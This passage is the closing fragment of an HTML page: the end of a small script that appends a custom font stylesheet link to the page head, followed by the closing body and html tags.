        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
